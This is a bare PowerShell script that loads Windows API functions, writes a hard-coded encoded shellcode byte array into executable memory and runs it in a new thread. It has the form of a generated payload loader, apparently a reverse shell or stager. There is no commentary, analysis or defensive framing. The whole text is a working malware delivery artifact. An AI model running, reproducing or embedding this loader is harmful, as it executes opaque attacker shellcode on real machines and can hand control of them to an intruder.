$1Dt = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $1Dt -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc0,0xbd,0xd8,0xcb,0xbd,0x38,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x6a,0x18,0x83,0xc2,0x04,0x03,0x6a,0xcc,0x29,0x48,0xc4,0x04,0x2f,0xb3,0x35,0xd4,0x50,0x3d,0xd0,0xe5,0x50,0x59,0x90,0x55,0x61,0x29,0xf4,0x59,0x0a,0x7f,0xed,0xea,0x7e,0xa8,0x02,0x5b,0x34,0x8e,0x2d,0x5c,0x65,0xf2,0x2c,0xde,0x74,0x27,0x8f,0xdf,0xb6,0x3a,0xce,0x18,0xaa,0xb7,0x82,0xf1,0xa0,0x6a,0x33,0x76,0xfc,0xb6,0xb8,0xc4,0x10,0xbf,0x5d,0x9c,0x13,0xee,0xf3,0x97,0x4d,0x30,0xf5,0x74,0xe6,0x79,0xed,0x99,0xc3,0x30,0x86,0x69,0xbf,0xc2,0x4e,0xa0,0x40,0x68,0xaf,0x0d,0xb3,0x70,0xf7,0xa9,0x2c,0x07,0x01,0xca,0xd1,0x10,0xd6,0xb1,0x0d,0x94,0xcd,0x11,0xc5,0x0e,0x2a,0xa0,0x0a,0xc8,0xb9,0xae,0xe7,0x9e,0xe6,0xb2,0xf6,0x73,0x9d,0xce,0x73,0x72,0x72,0x47,0xc7,0x51,0x56,0x0c,0x93,0xf8,0xcf,0xe8,0x72,0x04,0x0f,0x53,0x2a,0xa0,0x5b,0x79,0x3f,0xd9,0x01,0x15,0x8c,0xd0,0xb9,0xe5,0x9a,0x63,0xc9,0xd7,0x05,0xd8,0x45,0x5b,0xcd,0xc6,0x92,0x9c,0xe4,0xbf,0x0d,0x63,0x07,0xc0,0x04,0xa7,0x53,0x90,0x3e,0x0e,0xdc,0x7b,0xbf,0xaf,0x09,0x11,0xba,0x27,0x9b,0x89,0x90,0x93,0xb3,0x57,0x19,0xca,0x1f,0xd1,0xff,0xbc,0xcf,0xb1,0xaf,0x7c,0xa0,0x71,0x00,0x14,0xaa,0x7d,0x7f,0x04,0xd5,0x57,0xe8,0xae,0x3a,0x0e,0x40,0x46,0xa2,0x0b,0x1a,0xf7,0x2b,0x86,0x66,0x37,0xa7,0x25,0x96,0xf9,0x40,0x43,0x84,0x6d,0xa1,0x1e,0xf6,0x3b,0xbe,0xb4,0x9d,0xc3,0x2a,0x33,0x34,0x94,0xc2,0x39,0x61,0xd2,0x4c,0xc1,0x44,0x69,0x44,0x57,0x27,0x05,0xa9,0xb7,0xa7,0xd5,0xff,0xdd,0xa7,0xbd,0xa7,0x85,0xfb,0xd8,0xa7,0x13,0x68,0x71,0x32,0x9c,0xd9,0x26,0x95,0xf4,0xe7,0x11,0xd1,0x5a,0x17,0x74,0xe3,0xa7,0xce,0xb0,0x91,0xc9,0xd2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$iSS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($iSS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$iSS,0,0,0);for (;;){Start-sleep 60};
